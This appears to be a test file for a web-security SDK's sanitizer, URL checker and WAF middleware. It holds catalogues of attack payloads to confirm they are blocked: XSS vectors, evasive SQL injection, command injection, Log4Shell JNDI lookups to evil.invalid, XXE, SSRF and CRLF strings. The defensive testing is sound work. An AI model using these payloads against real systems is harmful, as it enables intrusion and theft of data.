import test from "node:test";
import assert from "node:assert/strict";

import {
  analyzeSqlSemantic,
  analyzeXssSemantic,
  buildSecurityHeaders,
  createFetchWebShield,
  createMemoryRateLimiter,
  createWebShieldMiddleware,
  escapeHtml,
  generateCspNonce,
  inspectInput,
  isSafeUrl,
  sanitizeHtml,
  SDK_VERSION,
  type CustomWafRule,
  type RaksaReport,
  type WebShieldResponseLike,
} from "../dist/index.js";

test("SDK v0.3.0 exports and escapeHtml encodes dangerous characters safely", () => {
  assert.equal(SDK_VERSION, "0.3.0");
  assert.equal(
    escapeHtml(`<div class="a" data-x='1'>a & b \`c\`</div>`),
    "&lt;div class=&quot;a&quot; data-x=&#39;1&#39;&gt;a &amp; b &#96;c&#96;&lt;/div&gt;",
  );
});

test("sanitizeHtml balances tags, normalizes multi-encoded URIs, and neutralizes 40+ XSS vectors", () => {
  const safe = sanitizeHtml(
    `<p class="lead">Hello <strong>world</strong> &amp; <a href="https://example.org/docs" target="_blank">docs</a></p>`,
  );
  assert.match(safe, /^<p class="lead">Hello <strong>world<\/strong>/);
  assert.match(safe, /rel="noopener noreferrer"/);

  assert.equal(sanitizeHtml(`<p>open <b>bold`), `<p>open <b>bold</b></p>`);
  assert.equal(sanitizeHtml(`</b></p><p>clean</p></b>`), `<p>clean</p>`);

  const vectors = [
    `<script>alert(1)</script>`,
    `<SCRIPT SRC="https://evil.invalid/x.js"></SCRIPT>`,
    `<scr<script>ipt>alert(1)</scr</script>ipt>`,
    `<img src=x onerror=alert(1)>`,
    `<img src="javascript:alert(1)">`,
    `<svg onload="alert(1)"><circle/></svg>`,
    `<svg/onload=alert(1)>`,
    `<svg><script>alert(1)</script></svg>`,
    `<iframe src="javascript:alert(1)"></iframe>`,
    `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
    `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`,
    `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">`,
    `<style>body{background:url(javascript:alert(1))}</style>`,
    `<template><script>alert(1)</script></template>`,
    `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
    `<textarea><img src=x onerror=alert(1)></textarea>`,
    `<xmp><script>alert(1)</script></xmp>`,
    `<a href="javascript:alert(1)">click</a>`,
    `<a href="JAVASCRIPT:alert(1)">upper</a>`,
    `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">ent</a>`,
    `<a href="&#x6a;avascript:alert(1)">hex</a>`,
    `<a href="&amp;#x6a;avascript:alert(1)">double-ent</a>`,
    `<a href="&amp;amp;#106;avascript:alert(1)">triple-ent</a>`,
    `<a href="java\tscript:alert(1)">tab</a>`,
    `<a href="java\nscript:alert(1)">nl</a>`,
    `<a href="java\rscript:alert(1)">cr</a>`,
    `<a href="\x01javascript:alert(1)">ctrl</a>`,
    `<a href="java&#x09;script:alert(1)">ent-tab</a>`,
    `<a href="javascript&#58;alert(1)">ent-colon</a>`,
    `<a href="javascript&colon;alert(1)">named-colon</a>`,
    `<a href="vbscript:msgbox(1)">vb</a>`,
    `<a href="data:text/html,<script>alert(1)</script>">data</a>`,
    `<a href="data:text/html;base64,PHNjcmlwdD4=">data-b64</a>`,
    `<p onclick="fetch('https://evil.invalid')">tap</p>`,
    `<p onmouseover=alert(1) style="color:expression(alert(1))">hover</p>`,
    `<p onfocus=alert(1) autofocus>focus</p>`,
    `<p onanimationstart=alert(1)>anim</p>`,
    `<a href="//evil.invalid/phish">proto-rel</a>`,
    `<a href="/\\evil.invalid/phish">slash-bs</a>`,
    `<object data="data:text/html,xss"></object>`,
    `<embed src="javascript:alert(1)">`,
    `<script>unclosed`,
  ];

  assert.equal(vectors.length >= 40, true);
  for (const payload of vectors) {
    const cleaned = sanitizeHtml(payload);
    assert.equal(/<script\b/i.test(cleaned), false, `script leaked for: ${payload} -> ${cleaned}`);
    assert.equal(/\bon\w+\s*=/i.test(cleaned), false, `event handler leaked for: ${payload} -> ${cleaned}`);
    assert.equal(/(javascript|vbscript|data:text\/html)/i.test(cleaned), false, `scheme leaked for: ${payload} -> ${cleaned}`);
    assert.equal(/href="(?:\/\/|\/\\)/i.test(cleaned), false, `open-redirect href leaked for: ${payload}`);
    assert.equal(sanitizeHtml(cleaned), cleaned, `sanitizer failed idempotency for: ${payload}`);
  }
});

test("isSafeUrl and generateCspNonce validate URIs and produce base64url nonces", () => {
  assert.equal(isSafeUrl("https://luminariadev.github.io/docs"), true);
  assert.equal(isSafeUrl("http://example.com/status"), true);
  assert.equal(isSafeUrl("mailto:security@example.com"), true);
  assert.equal(isSafeUrl("/login?next=/dashboard"), true);
  assert.equal(isSafeUrl("#section-2"), true);

  assert.equal(isSafeUrl("&amp;#x6a;avascript:alert(1)"), false);
  assert.equal(isSafeUrl("&#x09;javascript:alert(1)"), false);
  assert.equal(isSafeUrl("data:text/html;base64,PHNjcmlwdD4="), false);
  assert.equal(isSafeUrl("//attacker.invalid/login"), false);

  const n1 = generateCspNonce();
  const n2 = generateCspNonce();
  assert.notEqual(n1, n2);
  assert.match(n1, /^[A-Za-z0-9_-]{20,}$/);

  const hdrs = buildSecurityHeaders({ nonce: n1 });
  assert.match(hdrs["Content-Security-Policy"] ?? "", new RegExp(`'nonce-${n1}' 'strict-dynamic'`));
  assert.match(hdrs["Content-Security-Policy"] ?? "", /form-action 'self'/);
  assert.equal(hdrs["X-Frame-Options"], "DENY");
  assert.equal(hdrs["Cross-Origin-Opener-Policy"], "same-origin");
});

test("inspectInput detects all 10 attack classes, evasive SQLi, and enforces anomalyThreshold", () => {
  assert.equal(
    inspectInput(JSON.stringify({ comment: "1 + 1 = 2 for Go & TypeScript team", page: "/docs" })).length,
    0,
  );

  const findings = inspectInput(
    JSON.stringify({
      xss: "<svg onload=alert(1)>",
      sqli: "UN/**/ION SEL/**/ECT username,password FROM users",
      lfi: "%2e%2e%2fetc%2fpasswd",
      proto: JSON.parse('{"__proto__":{"admin":true}}') as unknown,
      ssrf: "http://169.254.169.254/latest/meta-data/",
      cmdi: "; whoami && id",
      ssti: "${jndi:ldap://evil.invalid/a}",
      nosql: "{\"$ne\": \"\"}",
      xxe: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
      crlf: "next=%0d%0aSet-Cookie:%20session=hijacked",
    }),
  );
  const rules = new Set(findings.map((f) => f.rule_id));
  for (const id of [
    "WEB-301",
    "WEB-302",
    "WEB-303",
    "WEB-304",
    "WEB-305",
    "WEB-306",
    "WEB-307",
    "WEB-308",
    "WEB-309",
    "WEB-310",
  ]) {
    assert.equal(rules.has(id), true, `missing expected finding ${id}`);
  }

  assert.equal(inspectInput("; whoami", "inline://req", { anomalyThreshold: 9 }).length, 0);
  assert.equal(inspectInput("; whoami && {{7*7}}", "inline://req", { anomalyThreshold: 9 }).length, 2);
});

test("createMemoryRateLimiter enforces limits and caps LRU tracked keys", () => {
  const rl = createMemoryRateLimiter({ windowMs: 10_000, maxRequests: 2, maxTrackedKeys: 16 });
  assert.equal(rl.check("10.0.0.1").allowed, true);
  assert.equal(rl.check("10.0.0.1").allowed, true);
  const blocked = rl.check("10.0.0.1");
  assert.equal(blocked.allowed, false);
  assert.equal(blocked.retryAfterSeconds >= 1, true);

  for (let i = 0; i < 30; i++) {
    rl.check(`client-${i}`);
  }
  assert.equal(rl.size() <= 16, true);
});

test("createWebShieldMiddleware returns opaque 403 by default, inspects headers, rate limits, and sets nonces", () => {
  const mkRes = () => {
    const headers: Record<string, string> = { "X-Powered-By": "Express" };
    const locals: Record<string, unknown> = {};
    return {
      statusCode: 200,
      headers,
      locals,
      endedBody: "",
      setHeader(name: string, value: string) {
        headers[name] = value;
      },
      removeHeader(name: string) {
        delete headers[name];
      },
      end(chunk?: string) {
        this.endedBody = chunk ?? "";
      },
    } satisfies WebShieldResponseLike & {
      headers: Record<string, string>;
      endedBody: string;
    };
  };

  let capturedReport: RaksaReport | undefined;
  let capturedIncident = "";
  const enforceMw = createWebShieldMiddleware({
    mode: "enforce",
    cspNonce: true,
    onReport(rep, _req, incidentId) {
      capturedReport = rep;
      capturedIncident = incidentId;
    },
  });

  const resBlocked = mkRes();
  let nextCalled = false;
  enforceMw(
    {
      method: "POST",
      url: "/api/comment",
      headers: { "user-agent": "curl/8.0", referer: "https://example.org" },
      body: { text: "<script>alert(1)</script>" },
    },
    resBlocked,
    () => {
      nextCalled = true;
    },
  );
  assert.equal(nextCalled, false);
  assert.equal(resBlocked.statusCode, 403);
  assert.equal(resBlocked.headers["X-Powered-By"], undefined);
  assert.match(resBlocked.headers["Content-Security-Policy"] ?? "", /'nonce-/);
  assert.equal(typeof resBlocked.locals.cspNonce, "string");

  // Default 403 must be opaque and never expose internal rule_id or matched_sample.
  const bodyObj = JSON.parse(resBlocked.endedBody) as Record<string, unknown>;
  assert.match(String(bodyObj.incident_id), /^inc-/);
  assert.equal(bodyObj.report, undefined);
  assert.equal(resBlocked.endedBody.includes("WEB-301"), false);
  assert.equal(capturedIncident, bodyObj.incident_id);
  assert.equal(capturedReport?.posture.score, 82);
  assert.equal(capturedReport?.posture.grade, "B");

  // Header-borne Log4Shell payload must be caught.
  const resHdrAttack = mkRes();
  let hdrNext = false;
  enforceMw(
    {
      method: "GET",
      url: "/",
      headers: { "User-Agent": "${jndi:ldap://evil.invalid/exploit}" },
    },
    resHdrAttack,
    () => {
      hdrNext = true;
    },
  );
  assert.equal(hdrNext, false);
  assert.equal(resHdrAttack.statusCode, 403);

  // Rate-limited client triggers 429 + Retry-After.
  const rlMw = createWebShieldMiddleware({
    mode: "enforce",
    rateLimit: { windowMs: 10_000, maxRequests: 1 },
  });
  const rl1 = mkRes();
  const rl2 = mkRes();
  rlMw({ method: "GET", url: "/ok", ip: "198.51.100.7" }, rl1, () => {});
  rlMw({ method: "GET", url: "/ok", ip: "198.51.100.7" }, rl2, () => {});
  assert.equal(rl1.statusCode, 200);
  assert.equal(rl2.statusCode, 429);
  assert.equal(rl2.headers["Retry-After"], "10");
});

test("createFetchWebShield protects Request/Response handlers with nonces, WAF, and rate limiting", async () => {
  let reported = 0;
  const shield = createFetchWebShield({
    mode: "enforce",
    cspNonce: true,
    excludePaths: ["/healthz"],
    rateLimit: { windowMs: 10_000, maxRequests: 5 },
    onReport() {
      reported += 1;
    },
  });

  const okResp = await shield(
    new Request("https://app.example.org/dashboard", { method: "GET" }),
    (_req, ctx) =>
      new Response(JSON.stringify({ nonce: ctx.nonce }), {
        status: 200,
        headers: { "Content-Type": "application/json", "X-Powered-By": "EdgeRuntime" },
      }),
  );
  assert.equal(okResp.status, 200);
  assert.equal(okResp.headers.get("x-powered-by"), null);
  assert.match(okResp.headers.get("content-security-policy") ?? "", /'nonce-/);
  const okBody = (await okResp.json()) as { nonce: string };
  assert.equal(okBody.nonce.length > 10, true);

  const blockedResp = await shield(
    new Request("https://app.example.org/api/submit", {
      method: "POST",
      body: JSON.stringify({ q: "{{7*7}}" }),
      headers: { "Content-Type": "application/json" },
    }),
    () => new Response("should not run"),
  );
  assert.equal(blockedResp.status, 403);
  assert.equal(reported, 1);
  const blockedJson = (await blockedResp.json()) as Record<string, unknown>;
  assert.match(String(blockedJson.incident_id), /^inc-/);
  assert.equal(blockedJson.report, undefined);
});

test("v0.3.0 semantic SQLi/XSS tokenizers catch evasive vectors with zero prose false positives", () => {
  for (const sqli of [
    `1' AND 2>1--`,
    `admin'/**/OR/**/'a'='a`,
    `1) UNION ALL SELECT NULL,NULL--`,
    `1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
    `1' AND BENCHMARK(5000000,MD5(1))--`,
    `1' AND PG_SLEEP(5)--`,
    `1' ORDER BY 10--`,
    `1; EXEC xp_cmdshell`,
    `1' OR 1 IN (SELECT 1)--`,
  ]) {
    assert.equal(analyzeSqlSemantic(sqli).matched, true, `semantic SQLi missed: ${sqli}`);
    const hits = inspectInput(sqli, "inline://sqli");
    assert.equal(hits.some((f) => f.rule_id === "WEB-302"), true, `WEB-302 missed: ${sqli}`);
  }

  for (const xss of [
    `<img/src=x/onerror=alert(1)>`,
    `<details open ontoggle=alert(1)>`,
    `<body/onload=alert(1)>`,
    `<a href="java\tscript:alert(1)">x</a>`,
    `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
    `<form action="javascript:alert(1)"><input></form>`,
  ]) {
    assert.equal(analyzeXssSemantic(xss).matched, true, `semantic XSS missed: ${xss}`);
    const hits = inspectInput(xss, "inline://xss");
    assert.equal(hits.some((f) => f.rule_id === "WEB-301"), true, `WEB-301 missed: ${xss}`);
  }

  for (const benign of [
    `{"comment":"Hello world 1+1=2","path":"/docs/security","author":"alice"}`,
    `Please select a book from our catalog and order by popularity`,
    `Please use SELECT item_id FROM menu style descriptions in prose only.`,
    `alice or bob`,
  ]) {
    assert.equal(analyzeSqlSemantic(benign).matched, false, `SQLi FP on: ${benign}`);
    assert.equal(analyzeXssSemantic(benign).matched, false, `XSS FP on: ${benign}`);
    assert.equal(inspectInput(benign, "inline://benign").length, 0, `inspectInput FP on: ${benign}`);
  }
});

test("v0.3.0 customRules enforce block vs monitor actions in Node and Fetch middlewares", async () => {
  const customRules: CustomWafRule[] = [
    {
      id: "CUSTOM-GQL",
      title: "Block GraphQL introspection",
      severity: "medium",
      matchType: "regex",
      pattern: "__schema\\b",
      caseInsensitive: true,
      action: "block",
    },
    {
      id: "CUSTOM-LEGACY-HEADER",
      title: "Monitor deprecated auth query param",
      severity: "low",
      matchType: "contains",
      pattern: "legacy_token=",
      action: "monitor",
    },
  ];

  let nodeReports = 0;
  const mw = createWebShieldMiddleware({
    mode: "enforce",
    customRules,
    onReport() {
      nodeReports += 1;
    },
  });

  const mkRes = () => {
    const headers: Record<string, string> = {};
    return {
      statusCode: 200,
      headers,
      endedBody: "",
      setHeader(name: string, value: string) {
        headers[name] = value;
      },
      end(chunk?: string) {
        this.endedBody = chunk ?? "";
      },
    } satisfies WebShieldResponseLike & { headers: Record<string, string>; endedBody: string };
  };

  // Monitor custom rule allows request through while reporting telemetry.
  const resMon = mkRes();
  let monNext = false;
  mw({ method: "GET", url: "/api/items?legacy_token=abc123" }, resMon, () => {
    monNext = true;
  });
  assert.equal(monNext, true);
  assert.equal(nodeReports, 1);

  // Block custom rule returns opaque 403.
  const resBlk = mkRes();
  let blkNext = false;
  mw({ method: "POST", url: "/graphql", body: { query: "{ __schema { types { name } } }" } }, resBlk, () => {
    blkNext = true;
  });
  assert.equal(blkNext, false);
  assert.equal(resBlk.statusCode, 403);
  assert.equal(nodeReports, 2);

  // Fetch adapter enforces block rule identically.
  const fetchShield = createFetchWebShield({ mode: "enforce", customRules });
  const blockedFetch = await fetchShield(
    new Request("https://app.example.org/graphql", {
      method: "POST",
      body: "{ __schema { queryType { name } } }",
    }),
    () => new Response("ok"),
  );
  assert.equal(blockedFetch.status, 403);
});
